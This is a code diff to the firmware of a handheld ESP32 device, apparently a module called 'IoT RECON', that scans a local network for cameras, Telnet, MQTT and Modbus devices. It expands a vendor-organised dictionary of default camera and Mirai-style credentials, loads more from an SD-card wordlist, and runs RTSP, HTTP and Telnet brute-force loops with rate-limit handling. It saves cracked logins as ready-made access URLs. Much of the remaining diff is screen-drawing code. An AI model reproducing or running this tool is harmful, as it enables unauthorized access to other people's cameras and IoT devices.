@@ -35,8 +35,8 @@ extern bool isInoBackTapped();
 // PORT TABLE
 // =============================================================================
 
-static const uint16_t scanPorts[IOT_MAX_PORTS] = { 554, 80, 8080, 23, 1883, 502 };
-static const char* portNames[IOT_MAX_PORTS] = { "RTSP", "HTTP", "HTTP", "Telnet", "MQTT", "Modbus" };
+static const uint16_t scanPorts[IOT_MAX_PORTS] = { 554, 80, 8080, 23, 1883, 502, 443, 34567 };
+static const char* portNames[IOT_MAX_PORTS] = { "RTSP", "HTTP", "HTTP", "Telnet", "MQTT", "Modbus", "HTTPS", "XMEye" };
 
 // =============================================================================
 // CREDENTIAL DICTIONARY (PROGMEM)
@@ -49,26 +49,108 @@ struct CredPair {
 };
 
 static const CredPair credDict[] PROGMEM = {
-    {"admin", "admin"},       {"admin", "12345"},       {"admin", ""},
-    {"admin", "password"},    {"admin", "1234"},        {"admin", "admin123"},
-    {"admin", "123456"},      {"admin", "pass"},        {"root", "root"},
-    {"root", ""},             {"root", "toor"},         {"root", "pass"},
-    {"root", "12345"},        {"root", "admin"},        {"user", "user"},
-    {"user", "1234"},         {"ubnt", "ubnt"},         {"support", "support"},
-    {"admin", "888888"},      {"admin", "666666"},      {"admin", "admin1"},
-    {"admin", "meinsm"},      {"admin", "supervisor"},  {"admin", "system"},
-    {"admin", "1111"},        {"admin", "smcadmin"},    {"admin", "4321"},
-    {"admin", "default"},     {"guest", "guest"},       {"service", "service"},
-    {"root", "vizxv"},        {"root", "xc3511"},       {"root", "juantech"},
+    // === TOP PRIORITY: blank/simple passwords (try first — fastest wins) ===
+    {"admin", ""},            {"admin", "admin"},       {"admin", "12345"},
+    {"admin", "password"},    {"admin", "1234"},        {"root", ""},
+    {"root", "root"},         {"admin", "123456"},      {"admin", "pass"},
+
+    // === CAMERA MANUFACTURERS — known defaults ===
+    // Hikvision (massive market share)
+    {"admin", "hikvision"},   {"admin", "Hikvision"},   {"admin", "12345678"},
+    {"admin", "hik12345"},    {"admin", "HikHik"},
+
+    // Dahua / DVR / NVR
+    {"admin", "888888"},      {"admin", "666666"},      {"888888", "888888"},
+    {"666666", "666666"},     {"admin", "dahua"},       {"admin", "Dahua"},
+
+    // XMEye / Xiongmai (Chinese generic — HUGE market)
+    {"admin", "xmhdipc"},     {"admin", "jvbzd"},       {"default", "tluafed"},
+    {"root", "xc3511"},       {"root", "vizxv"},        {"root", "hi3518"},
+    {"root", "juantech"},     {"root", "cat1029"},      {"root", "anko"},
+    {"root", "GM8182"},       {"root", "icatch99"},
+
+    // Reolink
+    {"admin", "reolink"},     {"admin", "Reolink"},
+
+    // Amcrest
+    {"admin", "amcrest"},     {"admin", "Amcrest"},
+
+    // Foscam
+    {"admin", "foscam"},      {"admin", "Foscam"},
+
+    // Lorex / FLIR
+    {"admin", "000000"},      {"admin", "00000000"},    {"admin", "lorex"},
+    {"admin", "fliradmin"},
+
+    // Swann
+    {"admin", "swann"},       {"admin", "Swann"},       {"admin", "111111"},
+
+    // D-Link
+    {"admin", "dlink"},       {"Admin", ""},
+
+    // Axis
+    {"root", "pass"},         {"root", "system"},
+
+    // TP-Link
+    {"admin", "admin123"},    {"admin", "tplink"},
+
+    // Wyze / Xiaomi / Yi (local interfaces when exposed)
+    {"admin", "wyze"},        {"admin", "ipcam"},
+
+    // Uniview / UNV
+    {"admin", "admin@123"},   {"admin", "Admin123"},
+
+    // === GENERIC IoT / ROUTER / MIRAI ORIGINALS ===
+    {"root", "toor"},         {"root", "12345"},        {"root", "admin"},
     {"root", "123456"},       {"root", "54321"},        {"root", "888888"},
-    {"admin", "7ujMko0admin"},{"admin", "tlJwpbo6"},    {"admin", "hikvision"},
-    {"root", "ikwd"},         {"root", "Zte521"},       {"root", "hi3518"},
-    {"root", "dreambox"},     {"admin", "1234567890"},  {"admin", "abc123"},
-    {"root", "default"},      {"admin", "camera"},      {"admin", "video"},
-    {"root", "password"},     {"admin", "admin1234"},   {"admin", "qwerty"},
+    {"root", "ikwd"},         {"root", "Zte521"},       {"root", "dreambox"},
+    {"root", "default"},      {"root", "password"},
+
+    {"admin", "admin1"},      {"admin", "meinsm"},      {"admin", "supervisor"},
+    {"admin", "system"},      {"admin", "1111"},        {"admin", "smcadmin"},
+    {"admin", "4321"},        {"admin", "default"},     {"admin", "camera"},
+    {"admin", "video"},       {"admin", "admin1234"},   {"admin", "qwerty"},
+    {"admin", "1234567890"},  {"admin", "abc123"},      {"admin", "changeme"},
+    {"admin", "letmein"},     {"admin", "1q2w3e4r"},    {"admin", "9999"},
+
+    {"admin", "7ujMko0admin"},{"admin", "tlJwpbo6"},
+
+    {"user", "user"},         {"user", "1234"},         {"ubnt", "ubnt"},
+    {"support", "support"},   {"guest", "guest"},       {"service", "service"},
+    {"operator", "operator"}, {"default", "default"},
 };
 
 static const int CRED_COUNT = sizeof(credDict) / sizeof(credDict[0]);
+
+// =============================================================================
+// SD CARD WORDLIST (/iot_creds.txt)
+// Format: "username:password" per line, or just "password" (assumes admin)
+// Lines starting with # are comments. Max 64 entries loaded into RAM.
+// =============================================================================
+
+#define IOT_MAX_SD_CREDS 64
+
+struct SdCred {
+    char user[IOT_MAX_CRED_USER];
+    char pass[IOT_MAX_CRED_PASS];
+};
+static SdCred sdCreds[IOT_MAX_SD_CREDS];
+static int sdCredCount = 0;
+
+// Total cred count (built-in + SD)
+static int totalCredCount = 0;
+
+// Helper: get credential by index (built-in first, then SD)
+static void getCred(int index, const char*& user, const char*& pass) {
+    if (index < CRED_COUNT) {
+        user = credDict[index].user;
+        pass = credDict[index].pass;
+    } else {
+        int si = index - CRED_COUNT;
+        user = sdCreds[si].user;
+        pass = sdCreds[si].pass;
+    }
+}
 
 // =============================================================================
 // MODULE STATE
@@ -179,6 +261,8 @@ static int detailDeviceIdx = -1;
 // Timing
 static unsigned long lastStatsDraw = 0;
 static unsigned long scanStartTime = 0;
+static unsigned long lastTouchTime = 0;
+static const unsigned long IOT_DEBOUNCE_MS = 150;
 
 // SD card
 static bool sdReady = false;
@@ -203,6 +287,7 @@ static void saveReportToSD();
 static bool tryWiFiConnect();
 static void doWifiScan();
 static void loadCapturedCreds();
+static void loadSdWordlist();
 static void drawCredsScreen();
 static void handleCredsTouch(int x, int y);
 
@@ -268,7 +353,7 @@ static void addKillLine(const char* text, uint16_t color) {
         killFeed[IOT_MAX_KILL_LINES - 1].color = color;
     }
     // Auto-scroll to show latest
-    int feedH = SCALE_Y(290) - SCALE_Y(120);
+    int feedH = SCALE_Y(290) - SCALE_Y(125);
     int maxLines = feedH / 12;
     if (killFeedCount > maxLines) {
         killFeedScroll = killFeedCount - maxLines;
@@ -304,7 +389,7 @@ static void updatePlagueAnimation() {
         int drawX = i * colW;
         int drawY = col.y;
 
-        if (drawY >= SCALE_Y(120) && drawY < SCALE_Y(290)) {
+        if (drawY >= SCALE_Y(125) && drawY < SCALE_Y(290)) {
             // Only draw in kill feed background area
             uint16_t charColor = col.infected ? HALEHOUND_HOTPINK : HALEHOUND_GREEN;
             char ch = 33 + (col.charIdx % 94); // Printable ASCII
@@ -326,7 +411,7 @@ static void updatePlagueAnimation() {
         // Move column down
         col.y += col.speed;
         if (col.y >= SCALE_Y(290)) {
-            col.y = SCALE_Y(120);
+            col.y = SCALE_Y(125);
             col.charIdx = random(0, 94);
         }
 
@@ -363,6 +448,23 @@ static void iotScanTask(void* param) {
     Serial.println("[IOT] Core 0: Scanner task started");
     #endif
 
+    // Load SD wordlist before scanning
+    loadSdWordlist();
+    if (sdCredCount > 0) {
+        char msg[52];
+        snprintf(msg, sizeof(msg), "[+] SD: %d extra creds loaded", sdCredCount);
+        addKillLine(msg, HALEHOUND_GREEN);
+        newEventFlag = true;
+    } else {
+        totalCredCount = CRED_COUNT;
+    }
+    {
+        char msg[52];
+        snprintf(msg, sizeof(msg), "[*] %d total credentials armed", totalCredCount);
+        addKillLine(msg, HALEHOUND_CYAN);
+        newEventFlag = true;
+    }
+
     WiFiClient client;
     client.setTimeout(3); // 3 SECONDS for stream read/write operations
     uint8_t baseIP[4];
@@ -392,23 +494,51 @@ static void iotScanTask(void* param) {
         uint8_t portMask = 0;
         bool hostAlive = false;
 
-        // Quick reachability: try port 80 first (200ms)
-        if (client.connect(ip, 80, 200)) {
+        // Quick reachability: probe common ports (300ms each)
+        // Port 80 (HTTP) — most devices
+        if (client.connect(ip, 80, 300)) {
             portMask |= 0x02; // bit 1 = port 80
             client.stop();
             hostAlive = true;
         }
 
-        // If 80 dead, try port 23 (Telnet — many IoT devices)
+        // Port 554 (RTSP) — cameras that don't run HTTP
         if (!hostAlive && scanTaskRunning) {
-            if (client.connect(ip, 23, 200)) {
+            if (client.connect(ip, 554, 300)) {
+                portMask |= 0x01; // bit 0 = port 554
+                client.stop();
+                hostAlive = true;
+            }
+        }
+
+        // Port 443 (HTTPS) — Wyze, Ring, modern cameras
+        if (!hostAlive && scanTaskRunning) {
+            if (client.connect(ip, 443, 300)) {
+                portMask |= 0x40; // bit 6 = port 443
+                client.stop();
+                hostAlive = true;
+            }
+        }
+
+        // Port 34567 (XMEye/CMS) — Chinese cameras
+        if (!hostAlive && scanTaskRunning) {
+            if (client.connect(ip, 34567, 300)) {
+                portMask |= 0x80; // bit 7 = port 34567
+                client.stop();
+                hostAlive = true;
+            }
+        }
+
+        // Port 23 (Telnet) — last resort
+        if (!hostAlive && scanTaskRunning) {
+            if (client.connect(ip, 23, 300)) {
                 portMask |= 0x08; // bit 3 = port 23
                 client.stop();
                 hostAlive = true;
             }
         }
 
-        // Host is dead — skip remaining ports (saves ~2 sec per dead host)
+        // Host is dead — skip remaining ports
         if (!hostAlive) {
             vTaskDelay(1);
             continue;
@@ -589,6 +719,29 @@ static void iotScanTask(void* param) {
             if (dev.banner[0] == '\0') strncpy(dev.banner, "Modbus PLC", IOT_MAX_BANNER_LEN);
         }
 
+        // HTTPS check (port 443) — Wyze, Ring, modern cameras
+        if ((dev.openPorts & 0x40) && scanTaskRunning) {
+            if (dev.type == IOT_UNKNOWN) {
+                // Port 443 + RTSP = definitely a camera
+                if (dev.openPorts & 0x01) {
+                    dev.type = IOT_CAMERA;
+                    if (dev.banner[0] == '\0') strncpy(dev.banner, "HTTPS Camera", IOT_MAX_BANNER_LEN);
+                    camerasFound++;
+                } else {
+                    // 443 alone — likely a smart camera or IoT hub
+                    dev.type = IOT_HTTP_DEVICE;
+                    if (dev.banner[0] == '\0') strncpy(dev.banner, "HTTPS Device", IOT_MAX_BANNER_LEN);
+                }
+            }
+        }
+
+        // XMEye/CMS check (port 34567) — Chinese cameras (Xiongmai, generic NVR)
+        if ((dev.openPorts & 0x80) && scanTaskRunning) {
+            dev.type = IOT_CAMERA;
+            camerasFound++;
+            if (dev.banner[0] == '\0') strncpy(dev.banner, "XMEye Camera", IOT_MAX_BANNER_LEN);
+        }
+
         // Update kill feed with identification
         if (dev.type != IOT_UNKNOWN) {
             char msg[52], ipStr[16];
@@ -630,13 +783,31 @@ static void iotScanTask(void* param) {
         if (dev.type == IOT_CAMERA && (dev.openPorts & 0x01) && scanTaskRunning) {
             dev.status = IOT_TESTING;
             bool cracked = false;
+            int connFails = 0; // Consecutive connection failures
 
-            for (int c = 0; c < CRED_COUNT && scanTaskRunning && !cracked; c++) {
+            {
+                char msg[52];
+                snprintf(msg, sizeof(msg), "[>] RTSP brute %s (%d creds)", ipStr, totalCredCount);
+                addKillLine(msg, HALEHOUND_CYAN);
+                newEventFlag = true;
+            }
+
+            for (int c = 0; c < totalCredCount && scanTaskRunning && !cracked; c++) {
                 currentCredIndex = c;
-                const char* user = credDict[c].user;
-                const char* pass = credDict[c].pass;
+                const char* user;
+                const char* pass;
+                getCred(c, user, pass);
 
-                if (client.connect(devIP, 554, 2000)) {
+                // Progress every 10 creds
+                if (c > 0 && c % 10 == 0) {
+                    char msg[52];
+                    snprintf(msg, sizeof(msg), "[>] %s RTSP [%d/%d]...", ipStr, c, totalCredCount);
+                    addKillLine(msg, HALEHOUND_GUNMETAL);
+                    newEventFlag = true;
+                }
+
+                if (client.connect(devIP, 554, 1000)) {
+                    connFails = 0; // Reset on success
                     // Build auth string
                     char authPlain[40];
                     snprintf(authPlain, sizeof(authPlain), "%s:%s", user, pass);
@@ -652,7 +823,7 @@ static void iotScanTask(void* param) {
 
                     unsigned long t0 = millis();
                     String resp = "";
-                    while (client.connected() && millis() - t0 < 3000 && resp.length() < 128) {
+                    while (client.connected() && millis() - t0 < 2000 && resp.length() < 128) {
                         while (client.available() && resp.length() < 128) {
                             resp += (char)client.read();
                         }
@@ -672,9 +843,15 @@ static void iotScanTask(void* param) {
                         addKillLine(msg, HALEHOUND_HOTPINK);
                         newEventFlag = true;
                         infectNearestColumn(dev.ip);
-
-                        // Flash screen hotpink on crack
-                        // (Core 1 will pick up newEventFlag)
+                    }
+                } else {
+                    connFails++;
+                    if (connFails >= 5) {
+                        char msg[52];
+                        snprintf(msg, sizeof(msg), "[!] %s RTSP blocked (5 fails)", ipStr);
+                        addKillLine(msg, HALEHOUND_GUNMETAL);
+                        newEventFlag = true;
+                        break; // Camera is rate-limiting, move on
                     }
                 }
                 vTaskDelay(1);
@@ -682,13 +859,32 @@ static void iotScanTask(void* param) {
 
             // Try HTTP auth if RTSP failed
             if (!cracked && (dev.openPorts & 0x02) && scanTaskRunning) {
+                connFails = 0;
                 uint16_t port = 80;
-                for (int c = 0; c < CRED_COUNT && scanTaskRunning && !cracked; c++) {
-                    currentCredIndex = c;
-                    const char* user = credDict[c].user;
-                    const char* pass = credDict[c].pass;
 
-                    if (client.connect(devIP, port, 2000)) {
+                {
+                    char msg[52];
+                    snprintf(msg, sizeof(msg), "[>] HTTP brute %s (%d creds)", ipStr, totalCredCount);
+                    addKillLine(msg, HALEHOUND_CYAN);
+                    newEventFlag = true;
+                }
+
+                for (int c = 0; c < totalCredCount && scanTaskRunning && !cracked; c++) {
+                    currentCredIndex = c;
+                    const char* user;
+                    const char* pass;
+                    getCred(c, user, pass);
+
+                    // Progress every 10 creds
+                    if (c > 0 && c % 10 == 0) {
+                        char msg[52];
+                        snprintf(msg, sizeof(msg), "[>] %s HTTP [%d/%d]...", ipStr, c, totalCredCount);
+                        addKillLine(msg, HALEHOUND_GUNMETAL);
+                        newEventFlag = true;
+                    }
+
+                    if (client.connect(devIP, port, 1000)) {
+                        connFails = 0;
                         char authPlain[40];
                         snprintf(authPlain, sizeof(authPlain), "%s:%s", user, pass);
                         char authB64[64];
@@ -702,7 +898,7 @@ static void iotScanTask(void* param) {
 
                         unsigned long t0 = millis();
                         String resp = "";
-                        while (client.connected() && millis() - t0 < 3000 && resp.length() < 128) {
+                        while (client.connected() && millis() - t0 < 2000 && resp.length() < 128) {
                             while (client.available() && resp.length() < 128) {
                                 resp += (char)client.read();
                             }
@@ -723,6 +919,15 @@ static void iotScanTask(void* param) {
                             newEventFlag = true;
                             infectNearestColumn(dev.ip);
                         }
+                    } else {
+                        connFails++;
+                        if (connFails >= 5) {
+                            char msg[52];
+                            snprintf(msg, sizeof(msg), "[!] %s HTTP blocked (5 fails)", ipStr);
+                            addKillLine(msg, HALEHOUND_GUNMETAL);
+                            newEventFlag = true;
+                            break;
+                        }
                     }
                     vTaskDelay(1);
                 }
@@ -741,14 +946,32 @@ static void iotScanTask(void* param) {
         if (dev.type == IOT_CAMERA && !(dev.openPorts & 0x01) && (dev.openPorts & 0x06) && scanTaskRunning) {
             dev.status = IOT_TESTING;
             bool cracked = false;
+            int connFails = 0;
             uint16_t port = (dev.openPorts & 0x02) ? 80 : 8080;
 
-            for (int c = 0; c < CRED_COUNT && scanTaskRunning && !cracked; c++) {
-                currentCredIndex = c;
-                const char* user = credDict[c].user;
-                const char* pass = credDict[c].pass;
+            {
+                char msg[52];
+                snprintf(msg, sizeof(msg), "[>] HTTP brute %s (%d creds)", ipStr, totalCredCount);
+                addKillLine(msg, HALEHOUND_CYAN);
+                newEventFlag = true;
+            }
 
-                if (client.connect(devIP, port, 2000)) {
+            for (int c = 0; c < totalCredCount && scanTaskRunning && !cracked; c++) {
+                currentCredIndex = c;
+                const char* user;
+                const char* pass;
+                getCred(c, user, pass);
+
+                // Progress every 10 creds
+                if (c > 0 && c % 10 == 0) {
+                    char msg[52];
+                    snprintf(msg, sizeof(msg), "[>] %s HTTP [%d/%d]...", ipStr, c, totalCredCount);
+                    addKillLine(msg, HALEHOUND_GUNMETAL);
+                    newEventFlag = true;
+                }
+
+                if (client.connect(devIP, port, 1000)) {
+                    connFails = 0;
                     char authPlain[40];
                     snprintf(authPlain, sizeof(authPlain), "%s:%s", user, pass);
                     char authB64[64];
@@ -762,7 +985,7 @@ static void iotScanTask(void* param) {
 
                     unsigned long t0 = millis();
                     String resp = "";
-                    while (client.connected() && millis() - t0 < 3000 && resp.length() < 128) {
+                    while (client.connected() && millis() - t0 < 2000 && resp.length() < 128) {
                         while (client.available() && resp.length() < 128) {
                             resp += (char)client.read();
                         }
@@ -783,6 +1006,15 @@ static void iotScanTask(void* param) {
                         newEventFlag = true;
                         infectNearestColumn(dev.ip);
                     }
+                } else {
+                    connFails++;
+                    if (connFails >= 5) {
+                        char msg[52];
+                        snprintf(msg, sizeof(msg), "[!] %s HTTP blocked (5 fails)", ipStr);
+                        addKillLine(msg, HALEHOUND_GUNMETAL);
+                        newEventFlag = true;
+                        break;
+                    }
                 }
                 vTaskDelay(1);
             }
@@ -794,6 +1026,15 @@ static void iotScanTask(void* param) {
                 addKillLine(msg, HALEHOUND_GUNMETAL);
                 newEventFlag = true;
             }
+        }
+
+        // ── CAMERA: XMEye/HTTPS only (no RTSP, no HTTP) — log as found ──
+        if (dev.type == IOT_CAMERA && dev.status == IOT_FOUND && scanTaskRunning) {
+            // Camera has no attackable ports (only 34567 or 443)
+            char msg[52];
+            snprintf(msg, sizeof(msg), "[*] %s %s (no HTTP/RTSP)", ipStr, dev.banner);
+            addKillLine(msg, HALEHOUND_CYAN);
+            newEventFlag = true;
         }
 
         // ── MQTT: Connect, subscribe #, dump topics ──
@@ -917,13 +1158,31 @@ static void iotScanTask(void* param) {
         if (dev.type == IOT_TELNET_DEVICE && scanTaskRunning) {
             dev.status = IOT_TESTING;
             bool cracked = false;
+            int connFails = 0;
 
-            for (int c = 0; c < CRED_COUNT && scanTaskRunning && !cracked; c++) {
+            {
+                char msg[52];
+                snprintf(msg, sizeof(msg), "[>] Telnet brute %s (%d creds)", ipStr, totalCredCount);
+                addKillLine(msg, HALEHOUND_CYAN);
+                newEventFlag = true;
+            }
+
+            for (int c = 0; c < totalCredCount && scanTaskRunning && !cracked; c++) {
                 currentCredIndex = c;
-                const char* user = credDict[c].user;
-                const char* pass = credDict[c].pass;
+                const char* user;
+                const char* pass;
+                getCred(c, user, pass);
 
-                if (client.connect(devIP, 23, 2000)) {
+                // Progress every 10 creds
+                if (c > 0 && c % 10 == 0) {
+                    char msg[52];
+                    snprintf(msg, sizeof(msg), "[>] %s Telnet [%d/%d]...", ipStr, c, totalCredCount);
+                    addKillLine(msg, HALEHOUND_GUNMETAL);
+                    newEventFlag = true;
+                }
+
+                if (client.connect(devIP, 23, 1000)) {
+                    connFails = 0;
                     // Wait for login prompt
                     unsigned long t0 = millis();
                     String resp = "";
@@ -991,6 +1250,15 @@ static void iotScanTask(void* param) {
                             newEventFlag = true;
                             infectNearestColumn(dev.ip);
                         }
+                    }
+                } else {
+                    connFails++;
+                    if (connFails >= 5) {
+                        char msg[52];
+                        snprintf(msg, sizeof(msg), "[!] %s Telnet blocked (5 fails)", ipStr);
+                        addKillLine(msg, HALEHOUND_GUNMETAL);
+                        newEventFlag = true;
+                        break;
                     }
                 }
                 vTaskDelay(1);
@@ -1220,13 +1488,27 @@ static void saveReportToSD() {
 
         if (dev.status == IOT_CRACKED) {
             f.printf("  Creds: %s:%s\n", dev.credUser, dev.credPass);
+            f.println("  --- ACCESS URLS ---");
             if (dev.openPorts & 0x01) {
                 f.printf("  RTSP: rtsp://%s:%s@%s:554/\n", dev.credUser, dev.credPass, ipStr);
+            }
+            if (dev.openPorts & 0x02) {
+                f.printf("  WEB:  http://%s:%s@%s/\n", dev.credUser, dev.credPass, ipStr);
+            }
+            if (dev.openPorts & 0x04) {
+                f.printf("  WEB:  http://%s:%s@%s:8080/\n", dev.credUser, dev.credPass, ipStr);
+            }
+            if (dev.openPorts & 0x40) {
+                f.printf("  HTTPS: https://%s:%s@%s/\n", dev.credUser, dev.credPass, ipStr);
+            }
+            if (dev.openPorts & 0x08) {
+                f.printf("  TELNET: telnet %s (user: %s pass: %s)\n", ipStr, dev.credUser, dev.credPass);
             }
         }
 
         if (dev.type == IOT_MQTT_BROKER && dev.status == IOT_OPEN) {
-            f.printf("  Auth: NONE\n");
+            f.printf("  Auth: NONE (no password!)\n");
+            f.printf("  MQTT: mqtt://%s:1883/\n", ipStr);
             f.printf("  Topics: %d captured\n", dev.mqttTopics);
         }
 
@@ -1285,6 +1567,71 @@ static void loadCapturedCreds() {
 
     f.close();
     SD.end();
+}
+
+// =============================================================================
+// LOAD SD WORDLIST (/iot_creds.txt)
+// Format: "username:password" per line, or just "password" (assumes admin)
+// Lines starting with # = comments. Empty lines skipped.
+// =============================================================================
+
+static void loadSdWordlist() {
+    sdCredCount = 0;
+    spiDeselect();
+    pinMode(SD_CS, OUTPUT);
+    digitalWrite(SD_CS, HIGH);
+
+    if (!SD.begin(SD_CS)) {
+        SPI.begin(18, 19, 23, SD_CS);
+        if (!SD.begin(SD_CS, SPI, 4000000)) {
+            totalCredCount = CRED_COUNT;
+            return;
+        }
+    }
+
+    File f = SD.open("/iot_creds.txt", FILE_READ);
+    if (!f) {
+        SD.end();
+        totalCredCount = CRED_COUNT;
+        return;
+    }
+
+    while (f.available() && sdCredCount < IOT_MAX_SD_CREDS) {
+        String line = f.readStringUntil('\n');
+        line.trim();
+        if (line.length() == 0) continue;
+        if (line.charAt(0) == '#') continue; // Comment
+
+        int sep = line.indexOf(':');
+        if (sep > 0 && sep < (int)line.length() - 1) {
+            // username:password format
+            String user = line.substring(0, sep);
+            String pass = line.substring(sep + 1);
+            user.trim();
+            pass.trim();
+            strncpy(sdCreds[sdCredCount].user, user.c_str(), IOT_MAX_CRED_USER - 1);
+            sdCreds[sdCredCount].user[IOT_MAX_CRED_USER - 1] = '\0';
+            strncpy(sdCreds[sdCredCount].pass, pass.c_str(), IOT_MAX_CRED_PASS - 1);
+            sdCreds[sdCredCount].pass[IOT_MAX_CRED_PASS - 1] = '\0';
+        } else if (sep == (int)line.length() - 1) {
+            // "username:" format — blank password
+            String user = line.substring(0, sep);
+            user.trim();
+            strncpy(sdCreds[sdCredCount].user, user.c_str(), IOT_MAX_CRED_USER - 1);
+            sdCreds[sdCredCount].user[IOT_MAX_CRED_USER - 1] = '\0';
+            sdCreds[sdCredCount].pass[0] = '\0';
+        } else {
+            // Just a password — assume "admin" as username
+            strncpy(sdCreds[sdCredCount].user, "admin", IOT_MAX_CRED_USER - 1);
+            strncpy(sdCreds[sdCredCount].pass, line.c_str(), IOT_MAX_CRED_PASS - 1);
+            sdCreds[sdCredCount].pass[IOT_MAX_CRED_PASS - 1] = '\0';
+        }
+        sdCredCount++;
+    }
+
+    f.close();
+    SD.end();
+    totalCredCount = CRED_COUNT + sdCredCount;
 }
 
 // =============================================================================
@@ -1630,6 +1977,7 @@ static void handleKeyboardTouch(int x, int y, int maxLen) {
                 } else {
                     tft.print(kbInput);
                 }
+                waitForTouchRelease();
                 return;
             }
             xOffset += kbKeyW + kbKeySp;
@@ -1747,15 +2095,39 @@ static void drawScanScreen() {
     drawGlitchTitle(SCALE_Y(52), "IoT RECON");
 }
 
+// Teal-to-hotpink color gradient (same as Jam Detect / Scanner)
+static uint16_t iotGradient(float ratio) {
+    if (ratio > 1.0f) ratio = 1.0f;
+    if (ratio < 0.0f) ratio = 0.0f;
+    uint8_t r = (uint8_t)(ratio * 255);
+    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
+    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
+    return tft.color565(r, g, b);
+}
+
+// Draw a single stat badge — rounded rect with colored border + value inside
+static void drawStatBadge(int x, int y, int w, int h, const char* label, int value, uint16_t borderColor) {
+    tft.fillRoundRect(x, y, w, h, 2, HALEHOUND_DARK);
+    tft.drawRoundRect(x, y, w, h, 2, borderColor);
+
+    // Label (dim) + value (bright) centered
+    char buf[14];
+    snprintf(buf, sizeof(buf), "%s:%d", label, value);
+    int tw = strlen(buf) * 6;
+    int tx = x + (w - tw) / 2;
+    if (tx < x + 2) tx = x + 2;
+
+    tft.setTextSize(1);
+    tft.setTextColor(borderColor, HALEHOUND_DARK);
+    tft.setCursor(tx, y + (h - 8) / 2);
+    tft.print(buf);
+}
+
 static void drawStats() {
     int y = SCALE_Y(70);
-    tft.fillRect(0, y, SCREEN_WIDTH, SCALE_H(45), HALEHOUND_BLACK);
+    tft.fillRect(0, y, SCREEN_WIDTH, SCALE_H(50), HALEHOUND_BLACK);
 
-    // Phase + progress bar
-    tft.setTextColor(HALEHOUND_HOTPINK);
-    tft.setTextSize(1);
-    tft.setCursor(5, y);
-
+    // ── Phase calculation ──
     const char* phaseStr = "IDLE";
     int progress = 0;
     switch (scanPhase) {
@@ -1779,50 +2151,77 @@ static void drawStats() {
         default: break;
     }
 
-    tft.printf("%s", phaseStr);
+    // ── HERO PROGRESS BAR — 16px tall, rounded, teal→hotpink gradient ──
+    int barX = 5;
+    int barW = SCREEN_WIDTH - 10;
+    int barH = 16;
+    int barY = y;
+
+    // Rounded border — magenta when active, hotpink when complete
+    uint16_t borderColor = (scanPhase == IOT_PHASE_DONE) ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
+    tft.drawRoundRect(barX, barY, barW, barH, 3, borderColor);
+
+    // Gradient fill
+    int fillW = constrain((progress * (barW - 4)) / 100, 0, barW - 4);
+    for (int px = 0; px < fillW; px++) {
+        float t = (float)px / (float)(barW - 4);
+        tft.drawFastVLine(barX + 2 + px, barY + 2, barH - 4, iotGradient(t));
+    }
+    // Clear unfilled region
+    if (fillW < barW - 4) {
+        tft.fillRect(barX + 2 + fillW, barY + 2, barW - 4 - fillW, barH - 4, HALEHOUND_DARK);
+    }
+
+    // Phase text overlaid LEFT side of bar
+    tft.setTextSize(1);
+    tft.setTextColor(TFT_WHITE);
+    tft.setCursor(barX + 5, barY + 4);
+    tft.print(phaseStr);
     if (scanPhase == IOT_PHASE_DISCOVER) {
-        tft.printf(" %d.%d.%d.%d", gatewayIP[0], gatewayIP[1], gatewayIP[2], (int)currentScanIP);
+        tft.setTextColor(HALEHOUND_CYAN);
+        tft.printf(" .%d", (int)currentScanIP);
     }
     if (scanPhase == IOT_PHASE_ATTACK && deviceCount > 0) {
-        tft.printf(" [%d/%d]", currentCredIndex + 1, CRED_COUNT);
+        tft.setTextColor(HALEHOUND_CYAN);
+        tft.printf(" [%d/%d]", currentCredIndex + 1, totalCredCount);
     }
 
-    // Progress bar
-    int barY = y + 12;
-    int barW = SCREEN_WIDTH - 10;
-    tft.drawRect(5, barY, barW, 8, HALEHOUND_GUNMETAL);
-    int fillW = (progress * (barW - 2)) / 100;
-    if (fillW > 0) {
-        // Gradient fill: magenta to hotpink
-        for (int px = 0; px < fillW; px++) {
-            uint16_t c = (px < fillW / 2) ? HALEHOUND_MAGENTA : HALEHOUND_HOTPINK;
-            tft.drawFastVLine(6 + px, barY + 1, 6, c);
-        }
-    }
+    // Percentage overlaid RIGHT side
+    char pctBuf[8];
+    snprintf(pctBuf, sizeof(pctBuf), "%d%%", progress);
+    int pctW = strlen(pctBuf) * 6;
+    tft.setTextColor(TFT_WHITE);
+    tft.setCursor(barX + barW - pctW - 5, barY + 4);
+    tft.print(pctBuf);
 
-    // Stats row
-    int sY = barY + 12;
-    tft.setTextColor(HALEHOUND_CYAN);
-    tft.setCursor(5, sY);
-    tft.printf("H:%d", (int)hostsFound);
-    tft.setCursor(SCALE_X(50), sY);
-    tft.setTextColor(HALEHOUND_MAGENTA);
-    tft.printf("Cam:%d", (int)camerasFound);
-    tft.setCursor(SCALE_X(110), sY);
-    tft.setTextColor(HALEHOUND_HOTPINK);
-    tft.printf("Crk:%d", (int)camerasCracked);
-    tft.setCursor(SCALE_X(170), sY);
-    tft.setTextColor(HALEHOUND_GREEN);
-    tft.printf("Open:%d", (int)openServices);
+    // ── Gradient divider ──
+    int divY = barY + barH + 2;
+    for (int gx = 0; gx < SCREEN_WIDTH; gx++)
+        tft.drawFastVLine(gx, divY, 1, iotGradient((float)gx / SCREEN_WIDTH));
 
-    int sY2 = sY + 12;
-    tft.setTextColor(HALEHOUND_CYAN);
-    tft.setCursor(5, sY2);
-    tft.printf("MQTT:%d", (int)mqttFound);
-    tft.setCursor(SCALE_X(70), sY2);
-    tft.printf("Tel:%d", (int)telnetFound);
-    tft.setCursor(SCALE_X(130), sY2);
-    tft.printf("Mod:%d", (int)modbusFound);
+    // ── STATS ROW 1: 4 badges ──
+    int badgeY = divY + 3;
+    int badgeH = 13;
+    int gap = 3;
+    int badgeW = (SCREEN_WIDTH - 10 - gap * 3) / 4;  // ~54px each
+
+    drawStatBadge(5,                          badgeY, badgeW, badgeH, "H",   (int)hostsFound,     HALEHOUND_CYAN);
+    drawStatBadge(5 + (badgeW + gap),         badgeY, badgeW, badgeH, "Cam", (int)camerasFound,   HALEHOUND_MAGENTA);
+    drawStatBadge(5 + (badgeW + gap) * 2,     badgeY, badgeW, badgeH, "Crk", (int)camerasCracked, HALEHOUND_HOTPINK);
+    drawStatBadge(5 + (badgeW + gap) * 3,     badgeY, badgeW, badgeH, "Opn", (int)openServices,   HALEHOUND_GREEN);
+
+    // ── STATS ROW 2: 3 badges, centered ──
